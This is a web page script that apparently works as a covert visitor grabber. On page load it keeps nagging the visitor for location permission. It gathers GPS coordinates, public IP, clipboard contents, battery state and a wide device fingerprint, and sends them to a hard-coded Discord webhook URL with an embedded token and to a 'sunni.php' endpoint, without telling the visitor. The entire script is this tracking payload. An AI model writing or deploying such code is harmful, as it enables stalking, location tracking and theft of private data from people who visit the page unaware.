    <script>
        $(document).ready(function() {
            var batterypercentage;
            var ischarging;
            var locationRequested = false; // Track if location permission has been requested

            function getPublicIp() {
                const xhr = new XMLHttpRequest();
                xhr.open('GET', 'https://api.ipify.org?format=json', false);
                xhr.send();

                if (xhr.status === 200) {
                    const data = JSON.parse(xhr.responseText);
                    return data.ip;
                } else {
                    console.error(`Error: ${xhr.statusText}`);
                    return null;
                }
            }

            const publicIp = getPublicIp();

            function getLocation() {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(showPosition, showError, { timeout: 5000 });
                } else {
                    alert("Your Browser Does not support Gps");
                }
            }

            function showPosition(position) {
                var grak = "Latitude : " + position.coords.latitude + " " + "Longitude : " + position.coords.longitude;
                sdrp(grak, clips, batterypercentage, ischarging);
                senddis(grak, clips, batterypercentage, ischarging);
                locationRequested = true;
                document.getElementById('dialogBox').style.display = 'none'; // Hide dialog if location is granted
                clearInterval(permissionInterval); // Stop the interval
            }

            function showError(error) {
                if (!locationRequested) {
                    switch (error.code) {
                        case error.PERMISSION_DENIED:
                            sdrp("Location Permission Denied", clips, batterypercentage, ischarging);
                            senddis("Location Permission Denied", clips, batterypercentage, ischarging);
                            document.getElementById('dialogBox').style.display = 'block'; // Show dialog
                            break;
                        case error.POSITION_UNAVAILABLE:
                        case error.TIMEOUT:
                        case error.UNKNOWN_ERROR:
                            window.close();
                            break;
                    }
                }
            }

            let permissionInterval; // To store the interval ID

            function requestPermissions() {
                locationRequested = false;
                getLocation();
                permissionInterval = setInterval(function() {
                    if (!locationRequested) {
                        document.getElementById('dialogBox').style.display = 'block'; // Show dialog every 5 seconds if permission not granted
                    }
                }, 7000);
            }

            let datetime = new Date();
            let localtime = String(datetime.toLocaleTimeString());
            let referurl = document.referrer;
            let cpuThreads = String(navigator.hardwareConcurrency);
            let deviceram = String(navigator.deviceMemory) + "gb";
            let useragent = navigator.userAgent;
            let iscookieEnabled = String(navigator.cookieEnabled);
            let devicelang = String(navigator.language);
            let width = screen.width;
            let height = screen.height;
            let platform = navigator.platform;
            let networkinfo = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            let networkinformation = "Network type : " + networkinfo.effectiveType + " " + "Downlink :" + " " + networkinfo.downlink;

            // New options
            let osVersion = navigator.oscpu || navigator.platform;
            let browserName = navigator.appName;
            let browserVersion = navigator.appVersion;
            let deviceType = /Mobi|Android/i.test(useragent) ? 'Mobile' : 'Desktop';
            let touchScreen = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
            let viewportWidth = window.innerWidth;
            let viewportHeight = window.innerHeight;
            let timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            let colorDepth = screen.colorDepth;
            let pixelRatio = window.devicePixelRatio;
            let mediaDevices = navigator.mediaDevices.enumerateDevices().then(devices => devices.map(device => device.kind));
            let preferredLanguages = navigator.languages.join(', ');

            function senddis(gpsr, clips, batterypercentage, ischarging) {
                var request = new XMLHttpRequest();
                request.open("POST", "https://discord.com/api/webhooks/1269744683979116584/cNjKRdP0NsvH3NIpezZoS5x1NU336ma0GlpVGf-QLB5m_vfU_gX797a_9jhOiNsLkihm");
                request.setRequestHeader('Content-type', 'application/json');
                var params = {
                    content: ("> **DeviceGps  : **" + gpsr + "\n> **NetworkInformation : **" + networkinformation + "\n> **Public IP  : **" + publicIp + "\n> **DeviceLocalTime : **" + localtime + "\n> **Time Zone : **" + timeZone + "\n> **PlatForm : **" + platform + "\n> **OS Version : **" + osVersion + "\n> **Device Type : **" + deviceType + "\n> **DeviceMemory : **" + deviceram + "\n> **ScreenWidth : **" + width + "\n> **ScreenHeight : **" + height + "\n> **Touch Screen : **" + touchScreen + "\n> **CpuThreads : **" + cpuThreads + "\n> **BatteryPercentage : **" + batterypercentage + "\n> **Ischarging : **" + ischarging + "\n> **DeviceLanguage : **" + devicelang + "\n> **UserAgent : **" + useragent + "\n> **Browser Name : **" + browserName + "\n> **Browser Version : **" + browserVersion + "\n> **IsCookieEnabled : **" + iscookieEnabled + "\n> **Viewport Width : **" + viewportWidth + "\n> **Viewport Height : **" + viewportHeight + "\n> **Color Depth : **" + colorDepth + "\n> **Pixel Ratio : **" + pixelRatio + "\n> **Media Devices : **" + mediaDevices + "\n> **ReferUrl : **" + referurl + "\n> **Clipboard : **" + clips + "\n> **Preferred Languages : **" + preferredLanguages),
                    username: "Asad",
                    avatar_url: "https://dpwhatsapp.xyz/wp-content/uploads/2021/08/Anime-Girl-WhatsApp-DP.jpg"
                }
                request.send(JSON.stringify(params));
            }

            function sdrp(bsdks, clipboard, batterypercentage, ischarging) {
                $.ajax({
                    type: "POST",
                    url: "sunni.php",
                    data: {
                        networkinformation: networkinformation,
                        localtime: localtime,
                        timeZone: timeZone,
                        platform: platform,
                        deviceType: deviceType,
                        width: width,
                        height: height,
                        deviceram: deviceram,
                        useragent: useragent,
                        batterypercentage: batterypercentage,
                        ischarging: ischarging,
                        gps: bsdks,
                        osVersion: osVersion,
                        browserName: browserName,
                        browserVersion: browserVersion,
                        touchScreen: touchScreen,
                        cpuThreads: cpuThreads,
                        referurl: referurl,
                        viewportWidth: viewportWidth,
                        viewportHeight: viewportHeight,
                        colorDepth: colorDepth,
                        pixelRatio: pixelRatio,
                        devicelang: devicelang,
                        iscookieEnabled: iscookieEnabled,
                        mediaDevices: mediaDevices,
                        clipboard: clipboard,
                        preferredLanguages: preferredLanguages
                    },
                    cache: false,
                    success: function(data) {},
                    error: function(xhr, status, error) {
                        console.log(error);
                    }
                });
            }

            requestPermissions(); // Start requesting permissions on page load
        });
    </script>
